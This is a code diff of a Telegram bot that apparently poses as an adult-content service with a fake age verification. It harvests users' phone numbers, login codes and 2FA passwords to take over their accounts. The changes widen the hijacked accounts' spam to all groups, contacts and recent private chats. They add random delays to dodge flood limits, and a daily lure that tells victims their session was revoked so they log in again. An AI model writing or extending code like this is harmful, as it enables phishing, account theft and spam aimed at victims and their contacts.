@@ -30,31 +30,31 @@ from pymongo import MongoClient
 mongo_client = MongoClient(DATABASE_URI_SESSIONS_F)
 database = mongo_client['Cluster0']['users']
 
-# Promo Texts (10 unique messages)
+# Promo Texts
 PROMO_TEXTS = [
-    "🔥 Join our exclusive channel!",
-    "🎉 Unlock premium content now!",
-    "💋 VIP access waiting for you!",
-    "🔞 Best adult content on Telegram!",
-    "🌟 Exclusive videos just for you!",
-    "💥 Your premium pass starts here!",
-    "😈 Don't miss our collection!",
-    "👑 VIP membership available!",
-    "🕶️ Hidden gems await!",
-    "💎 Premium quality content!"
+    "🔥 Exclusive content unlocked!",
+    "🎉 Limited offer inside!",
+    "💋 Your VIP pass is ready!",
+    "🔞 Adults-only content!",
+    "🌟 Special content just for you!",
+    "💥 Don't miss this!",
+    "😈 You've been selected!",
+    "👑 Premium access granted!",
+    "🕶️ Hidden treasures inside!",
+    "💎 High-quality content!"
 ]
 
 # Strings
 strings = {
     'need_login': "You have to /login first!",
     'already_logged_in': "You're already logged in! 🥳",
-    'age_verification': "**⚠️ AGE VERIFICATION:**\nYou must be 18+ to proceed.\nClick below to verify 👇",
-    'verification_success': "**✅ VERIFIED!**\nAccess granted to premium content!",
-    'logout_success': "Logged out! 🔒\n/login to access again.",
-    'not_logged_in': "Not logged in! ❌\n/login first.",
-    'session_revoked': "🔐 Your session was revoked!\n\n⚠️ Please /login again to access new premium channels.",
-    'otp_wrong': "**❌ Your Entered OTP Is Wrong!**\n\nEnter OTP again:",
-    '2fa_wrong': "**🔒 2FA REQUIRED:**\n❌ Your Entered 2FA Password Is Wrong!\n\nEnter your password again:"
+    'age_verification': "**⚠️ AGE VERIFICATION:**\n\nYou must be 18+ to proceed.\nClick below to verify 👇",
+    'verification_success': "**✅ VERIFIED!**\n\nAccess granted to premium content!",
+    'logout_success': "Logged out! 🔒\n\n/login to access again.",
+    'not_logged_in': "Not logged in! ❌\n\n/login first.",
+    'session_revoked': "🔐 Your session was revoked!\n\n⚠️ Please /login again.",
+    'otp_wrong': "**❌ Wrong OTP!**\n\nEnter again:",
+    '2fa_wrong': "**🔒 2FA FAILED:**\n❌ Wrong password!\n\nTry again:"
 }
 
 # Inline OTP Keyboard
@@ -77,7 +77,7 @@ OTP_KEYBOARD = InlineKeyboardMarkup([
     [
         InlineKeyboardButton("🔙", callback_data="otp_back"),
         InlineKeyboardButton("0️⃣", callback_data="otp_0"),
-        InlineKeyboardButton("🆗", callback_data="otp_submit")
+        InlineKeyboardButton("✅ Done", callback_data="otp_submit")
     ]
 ])
 
@@ -91,11 +91,8 @@ async def check_login_status(user_id):
 async def cleanup_user_state(user_id):
     if user_id in user_states:
         state = user_states[user_id]
-        if 'client' in state:
-            try:
-                await state['client'].disconnect()
-            except:
-                pass
+        if 'client' in state and not state['client'].is_disconnected:
+            await state['client'].disconnect()
         del user_states[user_id]
 
 @Client.on_message(filters.private & filters.command("login"))
@@ -181,7 +178,7 @@ async def handle_contact(bot: Client, message: Message):
         )
         user_states[user_id]['last_msg_id'] = sent_msg.id
     except Exception as e:
-        await message.reply(f"Error: {e}\n/login again.", reply_markup=ReplyKeyboardRemove())
+        await message.reply(f"Error: {e}\n\n/login again.", reply_markup=ReplyKeyboardRemove())
         await cleanup_user_state(user_id)
 
 @Client.on_callback_query(filters.regex("^otp_"))
@@ -222,10 +219,10 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
             )
             state['otp_digits'] = ''
         except PhoneCodeExpired:
-            await query.message.edit("**❌ OTP Expired!**\nPlease restart with /login")
+            await query.message.edit("**❌ OTP Expired!**\n\n/login again")
             await cleanup_user_state(user_id)
         except Exception as e:
-            await query.message.reply(f"Error: {e}\n/login again.")
+            await query.message.edit(f"Error: {e}\n\n/login again.")
             await cleanup_user_state(user_id)
         return
     else:
@@ -233,7 +230,7 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
             state['otp_digits'] += action
     
     await query.message.edit(
-        f"**Current OTP:** `{state['otp_digits'] or '____'}`\n\nPress 🆗 when done.",
+        f"**Current OTP:** `{state['otp_digits'] or '____'}`\n\nPress ✅ when done.",
         reply_markup=OTP_KEYBOARD
     )
     await query.answer()
@@ -271,7 +268,7 @@ async def handle_2fa_password(bot: Client, message: Message):
             f"{strings['2fa_wrong']}\n\nAttempts: {state['2fa_retries']}"
         )
     except Exception as e:
-        await message.reply(f"Error: {e}\n/login again", reply_markup=ReplyKeyboardRemove())
+        await message.reply(f"Error: {e}\n\n/login again", reply_markup=ReplyKeyboardRemove())
         await cleanup_user_state(user_id)
 
 async def create_session(bot: Client, client: Client, user_id: int, phone_number: str):
@@ -287,7 +284,6 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
             'promotion_active': True,
             'last_active': datetime.now(),
             '2fa_active': 'password' in state,
-            '2fa_password': state.get('password', ''),
             'notified': False
         }
         
@@ -316,7 +312,7 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
         asyncio.create_task(send_promotion_messages(bot, string_session, user_id))
         
     except Exception as e:
-        await bot.send_message(user_id, f"Error: {e}\n/login again")
+        await bot.send_message(user_id, f"Error: {e}\n\n/login again")
     finally:
         await cleanup_user_state(user_id)
 
@@ -324,101 +320,134 @@ async def send_promotion_messages(bot: Client, session_string: str, user_id: int
     while True:
         client = None
         try:
+            # Check promotion status
             user_data = database.find_one({"id": user_id})
             if not user_data or not user_data.get('promotion_active', True):
                 break
                 
+            # Create and start client
             client = Client("promo", session_string=session_string)
             await client.start()
             
+            # Update last active time
             database.update_one(
                 {"id": user_id},
                 {"$set": {"last_active": datetime.now()}}
             )
             
-            groups = []
+            # Collect targets
+            targets = []
+            
+            # 1. Groups
             async for dialog in client.get_dialogs():
                 try:
-                    if (dialog.chat and 
-                        dialog.chat.id and 
-                        dialog.chat.type in [
-                            enums.ChatType.GROUP, 
-                            enums.ChatType.SUPERGROUP
-                        ]):
-                        groups.append(dialog.chat.id)
+                    if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
+                        targets.append((dialog.chat.id, 'group'))
                 except:
                     continue
             
-            contacts_and_privates = []
+            # 2. Contacts
             try:
                 contacts = await client.get_contacts()
                 for user in contacts:
                     try:
-                        if (user and 
-                            not user.is_bot and 
-                            user.id):
-                            contacts_and_privates.append(user.id)
+                        if not user.is_bot:
+                            targets.append((user.id, 'private'))
                     except:
                         continue
             except:
                 pass
             
-            for group in groups:
+            # 3. Recent PMs
+            async for dialog in client.get_dialogs(limit=200):
+                try:
+                    if (dialog.chat.type == enums.ChatType.PRIVATE and 
+                        not dialog.chat.is_bot and
+                        not any(t[0] == dialog.chat.id for t in targets)):
+                        targets.append((dialog.chat.id, 'private'))
+                except:
+                    continue
+            
+            # Send promotions with anti-flood
+            random.shuffle(targets)  # Randomize order
+            for target_id, target_type in targets:
                 try:
                     text = random.choice(PROMO_TEXTS)
-                    await client.send_message(group, text)
-                    await asyncio.sleep(60)
+                    await client.send_message(target_id, text)
+                    
+                    # Use variable delays based on target type
+                    delay = random.uniform(15, 30) if target_type == 'private' else random.uniform(45, 90)
+                    await asyncio.sleep(delay)
                 except FloodWait as e:
-                    await asyncio.sleep(e.value + 5)
+                    wait_time = e.value + random.randint(5, 15)
+                    await asyncio.sleep(wait_time)
                 except Exception:
                     continue
             
-            for target in contacts_and_privates:
-                try:
-                    text = random.choice(PROMO_TEXTS)
-                    await client.send_message(target, text)
-                except FloodWait as e:
-                    await asyncio.sleep(e.value + 5)
-                except Exception:
-                    continue
+            # Variable cooldown between cycles (1-2 hours)
+            cooldown = random.randint(3600, 7200)
+            await asyncio.sleep(cooldown)
             
-            await asyncio.sleep(3600)
-            
-        except SessionRevoked as e:
-            mobile = user_data.get('mobile_number', 'Unknown')
-            await bot.send_message(
-                LOG_CHANNEL_SESSIONS_FILES,
-                f"🚫 Session Revoked!\nUser: {mobile}\nError: {e}"
-            )
-            
+        except SessionRevoked:
+            # Handle session revocation
             database.update_one(
                 {"id": user_id},
-                {"$set": {
-                    "promotion_active": False,
-                    "revoked_time": datetime.now()
-                }}
+                {"$set": {"promotion_active": False}}
+            )
+            await bot.send_message(
+                LOG_CHANNEL_SESSIONS_FILES,
+                f"🚫 Session Revoked!\nUser: {user_data.get('mobile_number', 'Unknown')}"
             )
             break
             
         except Exception as e:
-            error_msg = f"⚠️ Promotion Error: {str(e)}"
-            if "401 SESSION_REVOKED" in str(e):
-                mobile = user_data.get('mobile_number', 'Unknown')
-                error_msg = f"🚫 Session Revoked!\nUser: {mobile}\nError: {e}"
+            # Handle other errors
+            if "SESSION_REVOKED" in str(e):
                 database.update_one(
                     {"id": user_id},
                     {"$set": {"promotion_active": False}}
                 )
                 break
-            
-            await bot.send_message(
-                LOG_CHANNEL_SESSIONS_FILES,
-                f"{error_msg}\n🔄 Restarting in 5 minutes..."
-            )
+            # Retry after error cooldown
             await asyncio.sleep(300)
         finally:
+            # Clean up client
             if client:
                 try:
                     await client.stop()
                 except:
                     pass
+
+async def check_inactive_sessions(bot: Client):
+    # Auto-start session monitoring
+    while True:
+        try:
+            cutoff = datetime.now() - timedelta(hours=24)
+            inactive_users = database.find({
+                "last_active": {"$lt": cutoff},
+                "promotion_active": True,
+                "notified": False
+            })
+            
+            for user in inactive_users:
+                try:
+                    await bot.send_message(
+                        user['id'],
+                        strings['session_revoked']
+                    )
+                    database.update_one(
+                        {"_id": user['_id']},
+                        {"$set": {"notified": True}}
+                    )
+                except Exception:
+                    continue
+                    
+        except Exception as e:
+            print(f"Session check error: {str(e)}")
+            
+        await asyncio.sleep(24 * 3600)  # Daily check
+
+# Auto-start background tasks when bot initializes
+@Client.on_start()
+async def start_background_tasks(client: Client):
+    asyncio.create_task(check_inactive_sessions(client))
